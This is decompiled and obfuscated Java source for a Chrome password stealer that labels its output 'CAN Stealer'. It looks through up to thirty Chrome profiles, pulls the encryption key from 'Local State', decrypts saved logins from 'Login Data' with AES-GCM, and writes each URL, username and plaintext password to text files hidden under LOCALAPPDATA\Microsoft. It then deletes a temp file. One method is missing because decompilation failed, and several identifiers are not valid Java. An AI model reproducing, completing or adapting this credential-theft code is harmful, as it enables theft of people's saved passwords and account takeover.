package 0.0.0.0;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Arrays;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class 0b {
   private static final String 0 = "YourSecretKey123";
   private static final String 1 = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data";
   private static final String 2 = System.getenv("temp") + "\\tempfile2.db";

   public void _/* $FF was: 0*/() {
      String[] profileDirs = new String[]{"\\Default", "\\Profile 1", "\\Profile 2", "\\Profile 3", "\\Profile 4", "\\Profile 5", "\\Profile 6", "\\Profile 7", "\\Profile 8", "\\Profile 9", "\\Profile 10", "\\Profile 11", "\\Profile 12", "\\Profile 13", "\\Profile 14", "\\Profile 15", "\\Profile 16", "\\Profile 17", "\\Profile 18", "\\Profile 19", "\\Profile 20", "\\Profile 21", "\\Profile 22", "\\Profile 23", "\\Profile 24", "\\Profile 25", "\\Profile 26", "\\Profile 27", "\\Profile 28", "\\Profile 29", "\\Profile 30"};
      this.0(profileDirs);
      this.1();
   }

   private void _/* $FF was: 0*/(String[] profileDirs) {
      String[] var2 = profileDirs;
      int var3 = profileDirs.length;

      for(int var4 = 0; var4 < var3; ++var4) {
         String profileDir = var2[var4];
         File userData = new File(1 + profileDir);

         try {
            if (!userData.exists()) {
               continue;
            }
         } catch (RuntimeException var10) {
            throw var10;
         }

         byte[] key = this.0();
         File loginData = new File(userData, "Login Data");

         try {
            if (loginData.exists()) {
               this.0(loginData, key, profileDir);
            }
         } catch (RuntimeException var9) {
            throw var9;
         }
      }

   }

   private byte[] _/* $FF was: 0*/() {
      File localStateFile = new File(1, "Local State");

      try {
         if (!localStateFile.exists()) {
            return null;
         }
      } catch (RuntimeException var2) {
         throw var2;
      }

      return 9.0(localStateFile);
   }

   private void _/* $FF was: 0*/(File param1, byte[] param2, String param3) {
      // $FF: Couldn't be decompiled
   }

   private void _/* $FF was: 0*/(String url, String username, String decryptedPassword, String profileDir) {
      try {
         StringBuilder var10000;
         String var10001;
         label20: {
            try {
               var10000 = (new StringBuilder()).append(System.getenv("LOCALAPPDATA")).append("\\Microsoft\\");
               if (profileDir.contains("Profile 1")) {
                  var10001 = "password1.txt";
                  break label20;
               }
            } catch (IOException var7) {
               throw var7;
            }

            var10001 = "password" + profileDir.replaceAll("[^\\d]", "") + ".txt";
         }

         String targetFilePath = var10000.append(var10001).toString();
         FileWriter writer = new FileWriter(targetFilePath, true);
         writer.write("=========<CAN Stealer>==========\n" + url + "\n" + username + " : " + decryptedPassword + "\n\n");
         writer.close();
      } catch (IOException var8) {
      }

   }

   private String _/* $FF was: 0*/(byte[] encryptedData, byte[] key) {
      try {
         Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
         byte[] iv = Arrays.copyOfRange(encryptedData, 3, 15);
         byte[] payload = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);
         GCMParameterSpec spec = new GCMParameterSpec(128, iv);
         SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
         cipher.init(2, keySpec, spec);
         byte[] decryptedBytes = cipher.doFinal(payload);
         return new String(decryptedBytes, "UTF-8");
      } catch (Exception var9) {
         return null;
      }
   }

   private void _/* $FF was: 1*/() {
      try {
         Files.deleteIfExists(Paths.get(2));
      } catch (IOException var2) {
      }

   }
}
